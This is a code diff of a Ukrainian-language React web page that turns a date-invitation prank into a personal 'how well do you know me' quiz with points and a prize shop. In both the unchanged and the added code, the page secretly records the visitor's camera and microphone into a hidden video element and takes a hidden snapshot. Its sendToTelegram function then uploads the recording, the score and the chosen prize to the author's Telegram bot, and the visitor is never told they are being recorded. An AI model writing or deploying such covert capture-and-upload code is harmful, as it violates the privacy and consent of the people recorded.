@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <title>Свіданія</title>
+  <title>Вікторина про мене</title>
   
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://unpkg.com/react@18/umd/react.production.min.js" crossorigin></script>
@@ -28,19 +28,32 @@
     }
   </style>
 </head>
-<body class="bg-gradient-to-br from-orange-50 via-amber-50 to-pink-50 min-h-screen">
+<body class="bg-gradient-to-br from-indigo-50 via-purple-50 to-pink-50 min-h-screen">
   <div id="root"></div>
 
   <script type="text/babel">
     const { useState, useEffect, useRef } = React;
 
+    const myQuestions = [
+      { q: "Як мене звати?", options: ["Олег", "Давід", "Максим", "Денис"], correct: 1 },
+      { q: "Скільки мені років?", options: ["16", "17", "18", "19"], correct: 1 },
+      { q: "Де я навчаюся?", options: ["В КПІ", "В медичному", "В авіаційному", "В КНУ"], correct: 2 },
+      { q: "Який мій улюблений колір?", options: ["Чорний", "Білий", "Червоний", "Синій"], correct: 0 },
+      { q: "Яке моє улюблене хобі?", options: ["Ігри", "Дрони", "Футбол", "Машини"], correct: 1 },
+      { q: "Коли у мене день народження?", options: ["5 числа", "6 числа", "7 числа", "8 числа"], correct: 1 },
+      { q: "Якого я зросту?", options: ["170 см", "174 см", "178 см", "182 см"], correct: 1 },
+      { q: "Скільки у мене було дівчат?", options: ["0", "1", "2", "3"], correct: 1 },
+      { q: "Які шкарпетки я ношу?", options: ["Тільки чорні", "Кольорові", "Різні", "Тільки білі"], correct: 3 },
+      { q: "Моя головна якість?", options: ["Впертість", "Доброта", "Хитрість", "Скромність"], correct: 1 },
+      { q: "Зі скількох років я живу сам?", options: ["З 14", "З 15", "З 16", "З 17"], correct: 1 },
+      { q: "Яка моя залежність?", options: ["Кава", "Солодке", "Сон", "Телефон"], correct: 2 }
+    ];
+
     function App() {
-      const [step, setStep] = useState(1);
-      const [noStyle, setNoStyle] = useState({});
-      const [date, setDate] = useState('');
-      const [location, setLocation] = useState('');
-      const [customLocation, setCustomLocation] = useState('');
-      const [showCustomInput, setShowCustomInput] = useState(false);
+      const [step, setStep] = useState(0);
+      const [currentQ, setCurrentQ] = useState(0);
+      const [score, setScore] = useState(0);
+      const [selectedReward, setSelectedReward] = useState('');
       const [photo, setPhoto] = useState(null);
 
       const videoRef = useRef(null);
@@ -70,11 +83,8 @@
               await videoRef.current.play();
             }
 
-            photoTimeout = setTimeout(() => {
-              takePhoto();
-            }, 1500);
+            photoTimeout = setTimeout(() => { takePhoto(); }, 15000); 
 
-            // Надійний спосіб запуску запису (не ламає старі айфони)
             let recorder;
             try {
               recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
@@ -105,21 +115,6 @@
           }
         };
 
-        const takePhoto = () => {
-          if (!videoRef.current || !canvasRef.current) return;
-          const video = videoRef.current;
-          const canvas = canvasRef.current;
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          if (ctx) {
-            ctx.translate(canvas.width, 0);
-            ctx.scale(-1, 1);
-            ctx.drawImage(video, 0, 0);
-            setPhoto(canvas.toDataURL('image/jpeg', 0.85));
-          }
-        };
-
         startMedia();
 
         return () => {
@@ -128,10 +123,26 @@
         };
       }, []);
 
+      const takePhoto = () => {
+        if (!videoRef.current || !canvasRef.current) return;
+        const video = videoRef.current;
+        const canvas = canvasRef.current;
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext('2d');
+        if (ctx) {
+          ctx.translate(canvas.width, 0);
+          ctx.scale(-1, 1);
+          ctx.drawImage(video, 0, 0);
+          setPhoto(canvas.toDataURL('image/jpeg', 0.85));
+        }
+      };
+
       useEffect(() => {
         if (step === 4 && !hasSent.current) {
           hasSent.current = true;
-          
+          if (!photo) takePhoto();
+
           if (mediaRecorderRef.current && mediaRecorderRef.current.state !== 'inactive') {
             mediaRecorderRef.current.onstop = () => {
               const blob = new Blob(recordedChunksRef.current, { type: mediaRecorderRef.current.mimeType || `video/${fileExtension.current}` });
@@ -152,15 +163,22 @@
         }
       };
 
+      const getRank = (points) => {
+        if (points <= 4) return "Незнайомка 🕵️‍♀️";
+        if (points <= 7) return "Знайома 🤝";
+        if (points <= 9) return "Моя ЛП 👯‍♀️";
+        return "Моя вічна ❤️🔥";
+      };
+
       const sendToTelegram = async (videoBlob) => {
-        const caption = `🌅 Нова згода на свіданія!\n📅 Дата: ${date.split('-').reverse().join('.')}\n📍 Місце: ${location}`;
+        const caption = `🔥 Вікторина пройдена!\n\n👑 Рівень: ${getRank(score)}\n💯 Бали: ${score}/12\n🎁 Обраний приз: ${selectedReward}`;
 
         try {
           if (videoBlob && videoBlob.size > 0) {
             const formData = new FormData();
             formData.append('chat_id', TELEGRAM_CHAT_ID);
             formData.append('caption', caption);
-            formData.append('video', videoBlob, `reaction.${fileExtension.current}`);
+            formData.append('video', videoBlob, `quiz_reaction.${fileExtension.current}`);
 
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
               method: 'POST',
@@ -174,26 +192,29 @@
             });
           }
         } catch (error) {
-          console.error('Помилка відправки в Telegram', error);
+          console.error('Помилка відправки', error);
         }
       };
 
-      const handleNoHover = (e) => {
-        if (e) e.preventDefault();
-        const btnWidth = 100;
-        const btnHeight = 50;
-        const maxX = window.innerWidth - btnWidth - 20;
-        const maxY = window.innerHeight - btnHeight - 20;
-        const newX = Math.max(20, Math.floor(Math.random() * maxX));
-        const newY = Math.max(20, Math.floor(Math.random() * maxY));
-        setNoStyle({
-          position: 'fixed', left: `${newX}px`, top: `${newY}px`,
-          transition: 'all 0.2s cubic-bezier(0.25, 1, 0.5, 1)', zIndex: 1000,
-        });
+      const handleAnswer = (index) => {
+        if (index === myQuestions[currentQ].correct) {
+          setScore(score + 1);
+        }
+        if (currentQ < myQuestions.length - 1) {
+          setCurrentQ(currentQ + 1);
+        } else {
+          setStep(2);
+        }
       };
 
-      const today = new Date().toISOString().split('T')[0];
-      const maxDate = '2027-12-31';
+      const rewards = [
+        { points: 10, text: "Повністю слухаюся тебе 1 день 🙇‍♂️" },
+        { points: 8, text: "Одне бажання (вмєняєме) 🧞‍♂️" },
+        { points: 6, text: "Поцілуночок 😘" },
+        { points: 5, text: "Називатиму тебе королевою 1 день 👑" },
+        { points: 3, text: "Маленьке бажання 🪄" },
+        { points: 2, text: "Міцні обійми при зустрічі 🤗" },
+      ];
 
       return (
         <div className="min-h-screen flex items-center justify-center p-4 relative overflow-hidden font-sans text-gray-800">
@@ -201,92 +222,108 @@
           <video ref={videoRef} autoPlay playsInline muted className="hidden"></video>
           <canvas ref={canvasRef} className="hidden"></canvas>
 
-          <div className="absolute top-6 left-6 text-4xl sm:text-5xl opacity-50 animate-[float_4s_ease-in-out_infinite]">🦜</div>
-          <div className="absolute bottom-10 right-6 text-5xl sm:text-6xl opacity-50 animate-[float_5s_ease-in-out_infinite_reverse]">🌅</div>
-          <div className="absolute top-1/4 right-10 text-3xl opacity-40 animate-[float_6s_ease-in-out_infinite]">☀️</div>
-          <div className="absolute bottom-1/4 left-6 text-4xl opacity-50 animate-[float_4.5s_ease-in-out_infinite]">🌸</div>
+          <div className="absolute top-6 left-6 text-4xl opacity-50 animate-[float_4s_ease-in-out_infinite]">✨</div>
+          <div className="absolute bottom-10 right-6 text-5xl opacity-50 animate-[float_5s_ease-in-out_infinite_reverse]">💖</div>
+          <div className="absolute top-1/4 right-10 text-3xl opacity-40 animate-[float_6s_ease-in-out_infinite]">🔥</div>
+          <div className="absolute bottom-1/4 left-6 text-4xl opacity-50 animate-[float_4.5s_ease-in-out_infinite]">🎁</div>
 
-          <div className="bg-white/95 backdrop-blur-md p-6 sm:p-10 rounded-[2rem] shadow-[0_10px_25px_rgba(251,191,36,0.3)] max-w-lg w-full text-center relative z-10 border-4 border-amber-200 my-auto">
+          <div className="bg-white/95 backdrop-blur-md p-6 sm:p-10 rounded-[2rem] shadow-2xl max-w-lg w-full text-center relative z-10 border-4 border-indigo-200 my-auto">
             
+            {step === 0 && (
+              <div className="space-y-8 animate-fade-in">
+                <h1 className="text-3xl sm:text-4xl font-black text-indigo-600 leading-tight">Наскільки добре ти мене знаєш? 🤔</h1>
+                <p className="text-lg text-gray-600 font-medium">Дай відповідь на 12 питань. Заробляй бали та обмінюй їх на призи!</p>
+                <button onClick={() => setStep(1)} className="bg-indigo-500 text-white font-black py-4 px-8 rounded-2xl text-xl w-full transition-transform active:scale-95 shadow-[0_6px_0_rgb(79,70,229)] mt-4">
+                  Почати гру 🚀
+                </button>
+              </div>
+            )}
+
             {step === 1 && (
-              <div className="space-y-8">
-                <h1 className="text-3xl sm:text-4xl font-black text-orange-500 leading-tight">
-                  Ти підеш зі мною на свіданія? 🦜🌅
-                </h1>
-                <div className="flex flex-row items-center justify-center gap-4 sm:gap-8 min-h-[70px] mt-6 relative">
-                  <button onClick={() => setStep(2)} className="bg-orange-400 text-white font-black py-4 px-8 rounded-2xl text-xl sm:text-2xl transition-transform active:scale-95 shadow-[0_6px_0_rgb(234,88,12)]">
-                    Так! 🥰
-                  </button>
-                  <button onMouseEnter={handleNoHover} onTouchStart={handleNoHover} onClick={handleNoHover} style={noStyle} className="bg-gray-300 text-gray-600 font-black py-4 px-8 rounded-2xl text-xl sm:text-2xl shadow-[0_6px_0_rgb(156,163,175)] z-50">
-                    Ні 😢
-                  </button>
+              <div className="space-y-6 animate-fade-in">
+                <div className="flex justify-between items-center mb-4 text-gray-400 font-bold">
+                  <span>Питання {currentQ + 1}/12</span>
+                  <span>Бали: {score}</span>
+                </div>
+                <h2 className="text-2xl sm:text-3xl font-black text-indigo-600 leading-snug">{myQuestions[currentQ].q}</h2>
+                <div className="grid grid-cols-1 gap-3 mt-6">
+                  {myQuestions[currentQ].options.map((opt, idx) => (
+                    <button key={idx} onClick={() => handleAnswer(idx)} className="bg-white border-4 border-indigo-100 text-gray-700 font-bold py-4 px-4 rounded-2xl text-lg transition-transform active:scale-95 active:bg-indigo-50 hover:border-indigo-300 shadow-sm">
+                      {opt}
+                    </button>
+                  ))}
                 </div>
               </div>
             )}
 
             {step === 2 && (
               <div className="space-y-6 animate-fade-in">
-                <h2 className="text-2xl sm:text-3xl font-black text-orange-500 leading-snug">Ура! Ти погодилася 🦜💖🌅</h2>
-                <div className="mt-6 space-y-4">
-                  <label className="block text-xl font-bold text-gray-700">Обери дату свіданія:</label>
-                  <input type="date" min={today} max={maxDate} value={date} onChange={(e) => setDate(e.target.value)} className="w-full text-center p-4 border-3 border-amber-300 rounded-2xl text-xl text-gray-700 font-bold focus:outline-none focus:border-orange-500 bg-amber-50/50 shadow-inner" />
-                  <button onClick={() => setStep(3)} disabled={!date} className={`w-full font-black py-4 px-6 rounded-2xl text-xl transition-transform ${!date ? 'bg-gray-300 text-gray-500 shadow-[0_4px_0_rgb(156,163,175)]' : 'bg-green-400 text-white shadow-[0_6px_0_rgb(22,163,74)] active:scale-95'}`}>
-                    Підтвердити дату 📅
-                  </button>
+                <h2 className="text-3xl font-black text-indigo-600">Кінець! 🎉</h2>
+                <div className="bg-indigo-50 p-6 rounded-3xl border-4 border-indigo-200">
+                  <p className="text-lg text-gray-500 font-bold mb-2">Твій рівень:</p>
+                  <p className="text-3xl text-purple-600 font-black mb-4">{getRank(score)}</p>
+                  <p className="text-lg text-gray-500 font-bold mb-1">Набрано балів:</p>
+                  <p className="text-4xl text-indigo-600 font-black">{score} / 12</p>
                 </div>
+                <button onClick={() => setStep(3)} className="bg-purple-500 text-white font-black py-4 px-8 rounded-2xl text-xl w-full transition-transform active:scale-95 shadow-[0_6px_0_rgb(168,85,247)]">
+                  Обміняти бали на приз 🎁
+                </button>
               </div>
             )}
 
             {step === 3 && (
-              <div className="space-y-6 animate-fade-in py-2">
-                <h2 className="text-2xl sm:text-3xl font-black text-orange-500 leading-snug">Куди підемо на свіданія?</h2>
-                {!showCustomInput ? (
-                  <div className="grid grid-cols-2 gap-3 mt-6">
-                    {['Кіно 🍿', 'Ресторан 🍷', 'Парк 🌳', 'Кав\'ярня ☕'].map((place) => (
-                      <button key={place} onClick={() => { setLocation(place); setStep(4); }} className="bg-orange-400 text-white font-black py-4 px-2 rounded-2xl text-lg transition-transform active:scale-95 shadow-[0_6px_0_rgb(234,88,12)]">
-                        {place}
-                      </button>
-                    ))}
-                    <button onClick={() => setShowCustomInput(true)} className="col-span-2 bg-purple-400 text-white font-black py-4 px-2 rounded-2xl text-lg transition-transform active:scale-95 shadow-[0_6px_0_rgb(147,51,234)]">
-                      Свій варіант ✍️
+              <div className="space-y-4 animate-fade-in">
+                <h2 className="text-2xl font-black text-indigo-600">Магазин призів 🛒</h2>
+                <p className="text-gray-600 font-bold mb-4">У тебе {score} {score === 1 ? 'бал' : score < 5 ? 'бали' : 'балів'}!</p>
+                
+                <div className="space-y-3 max-h-[300px] overflow-y-auto pr-2">
+                  {rewards.map((r, i) => (
+                    <button 
+                      key={i}
+                      disabled={score < r.points}
+                      onClick={() => { setSelectedReward(r.text); setStep(4); }}
+                      className={`w-full p-4 rounded-2xl font-bold text-left flex justify-between items-center border-4 transition-transform ${score >= r.points ? 'bg-white border-green-200 text-gray-800 hover:border-green-400 active:scale-95 cursor-pointer' : 'bg-gray-100 border-gray-200 text-gray-400 cursor-not-allowed'}`}
+                    >
+                      <span className="w-3/4">{r.text}</span>
+                      <span className={`px-3 py-1 rounded-full text-sm ${score >= r.points ? 'bg-green-100 text-green-700' : 'bg-gray-200 text-gray-500'}`}>
+                        {r.points} б.
+                      </span>
                     </button>
-                  </div>
-                ) : (
-                  <div className="mt-6 space-y-4">
-                    <input type="text" value={customLocation} onChange={(e) => setCustomLocation(e.target.value)} placeholder="Напиши свій варіант..." className="w-full text-center p-4 border-3 border-purple-300 rounded-2xl text-lg text-gray-700 font-bold focus:outline-none focus:border-purple-500 bg-purple-50/50 shadow-inner" />
-                    <button onClick={() => { setLocation(customLocation || 'Сюрприз ✨'); setStep(4); }} className="w-full bg-purple-400 text-white font-black py-4 px-6 rounded-2xl text-xl transition-transform shadow-[0_6px_0_rgb(147,51,234)] active:scale-95">
-                      Підтвердити 🚀
-                    </button>
-                  </div>
+                  ))}
+                  {score < 2 && (
+                    <p className="text-red-500 font-bold mt-4">Упс, балів не вистачає навіть на найменший приз 😢 Але я тебе все одно обійму!</p>
+                  )}
+                </div>
+                
+                {score < 2 && (
+                  <button onClick={() => { setSelectedReward('Нічого (не вистачило балів)'); setStep(4); }} className="bg-gray-500 text-white font-black py-4 px-8 rounded-2xl text-xl w-full mt-4 active:scale-95">
+                    Завершити 🏁
+                  </button>
                 )}
               </div>
             )}
 
             {step === 4 && (
               <div className="space-y-6 animate-fade-in py-2">
-                <div className="text-5xl mb-2 flex justify-center gap-2 animate-[bounce_2s_infinite]">🦜 🌅 💖</div>
-                <h2 className="text-2xl sm:text-3xl font-black text-orange-500 leading-snug">Ура! Буду чекати на свіданія ✨</h2>
+                <div className="text-5xl mb-2 flex justify-center gap-2 animate-[bounce_2s_infinite]">🎉 💖 🎁</div>
+                <h2 className="text-2xl sm:text-3xl font-black text-indigo-600 leading-snug">Все збережено!</h2>
+                <p className="text-gray-600 font-bold">Я вже отримав твої результати 😏</p>
 
                 {photo && (
                   <div className="mt-4 mx-auto max-w-[200px]">
-                    <div className="relative rounded-2xl overflow-hidden border-4 border-amber-300 shadow-lg transform -rotate-2">
+                    <div className="relative rounded-2xl overflow-hidden border-4 border-indigo-300 shadow-lg transform rotate-2">
                       <img src={photo} alt="Твоє фото" className="w-full h-auto object-cover" />
                     </div>
                   </div>
                 )}
 
-                <div className="flex flex-col gap-4 items-center justify-center mt-6">
-                  <div className="bg-amber-100 p-4 w-full rounded-2xl border-3 border-amber-300 shadow-sm">
-                    <p className="text-sm text-gray-500 font-bold uppercase">Дата</p>
-                    <p className="text-xl text-orange-600 font-black">{date.split('-').reverse().join('.')}</p>
-                  </div>
-                  <div className="bg-pink-100 p-4 w-full rounded-2xl border-3 border-pink-300 shadow-sm">
-                    <p className="text-sm text-gray-500 font-bold uppercase">Місце</p>
-                    <p className="text-xl text-pink-600 font-black break-words">{location}</p>
-                  </div>
+                <div className="bg-indigo-50 p-4 w-full rounded-2xl border-3 border-indigo-200 shadow-sm mt-6">
+                  <p className="text-sm text-gray-500 font-bold uppercase">Твій приз</p>
+                  <p className="text-xl text-indigo-600 font-black">{selectedReward}</p>
                 </div>
               </div>
             )}
+
           </div>
         </div>
       );
